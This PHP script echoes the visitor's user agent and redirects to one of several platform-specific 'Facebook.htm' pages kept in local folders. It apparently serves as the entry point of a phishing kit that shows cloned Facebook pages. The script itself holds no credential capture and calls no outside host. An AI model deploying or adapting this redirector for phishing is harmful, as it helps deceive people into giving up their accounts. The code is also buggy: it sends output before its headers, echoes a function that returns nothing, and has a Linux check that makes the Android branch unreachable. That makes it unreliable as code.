<?php
	$user_agent = $_SERVER['HTTP_USER_AGENT'];
	echo $user_agent;
	function getPlatform($user_agent){
		if(strpos($user_agent, 'Windows NT 10.0') !== FALSE)
			header("Location: Web/Facebook.htm");
		elseif(strpos($user_agent, 'Windows NT 6.3') !== FALSE)
			header("Location: Web/Facebook.htm");
		elseif(strpos($user_agent, 'Windows NT 6.2') !== FALSE)
			header("Location: Web/Facebook.htm");
		elseif(strpos($user_agent, 'Windows NT 6.1') !== FALSE)
			header("Location: Web/Facebook.htm");
		elseif(strpos($user_agent, 'Windows NT 6.0') !== FALSE)
			header("Location: Web/Facebook.htm");
		elseif(strpos($user_agent, 'Windows NT 5.1') !== FALSE)
			header("Location: Web/Facebook.htm");
		elseif(strpos($user_agent, 'Windows NT 5.2') !== FALSE)
			header("Location: Web/Facebook.htm");
		elseif(strpos($user_agent, 'Windows NT 5.0') !== FALSE)
			header("Location: Web/Facebook.htm");
		elseif(strpos($user_agent, 'Windows ME') !== FALSE)
			header("Location: Facebook/Facebook.htm");
		elseif(strpos($user_agent, 'Win98') !== FALSE)
			header("Location: Facebook/Facebook.htm");
		elseif(strpos($user_agent, 'Windows Phone') !== FALSE)
			header("Location: Mobile/Facebook.htm");
		elseif(strpos($user_agent, 'Windows') !== FALSE)
			header("Location: Facebook/Facebook.htm");
		elseif(strpos($user_agent, 'iPhone') !== FALSE)
			header("Location: OS/Facebook.htm");
		elseif(strpos($user_agent, 'iPad') !== FALSE)
			header("Location: OS/Facebook.htm");
		elseif(strpos($user_agent, 'Debian') !== FALSE)
			header("Location: Web/Facebook.htm");
		elseif(strpos($user_agent, 'Ubuntu') !== FALSE)
			header("Location: Web/Facebook.htm");
		elseif(strpos($user_agent, 'Elementary OS') !== FALSE)
			header("Location: Web/Facebook.htm");
		elseif(strpos($user_agent, 'Kubuntu') !== FALSE)
			header("Location: Web/Facebook.htm");
		elseif(strpos($user_agent, 'Linux') !== FALSE)
			header("Location: Android/Facebook.htm");
		elseif(strpos($user_agent, 'BlackBerry') !== FALSE)
			header("Location: Mobile/Facebook.htm");
		elseif(strpos($user_agent, 'Android') || strpos($user_agent, 'Linux') !== FALSE)
			header("Location: Android/Facebook.htm");
		elseif(strpos($user_agent, 'Mobile') !== FALSE)
			header("Location: Mobile/Facebook.htm");
		elseif(strpos($user_agent, 'Mac OS X+') || strpos($user_agent, 'CFNetwork+') !== FALSE)
			header("Location: Web/Facebook.htm");
		elseif(strpos($user_agent, 'Macintosh') !== FALSE)
			header("Location: Web/Facebook.htm");
		else
			header("Location: Facebook/Facebook.htm");
	}
	$ua = getPlatform($user_agent);
	echo "<br />";
	echo $ua;
	
?>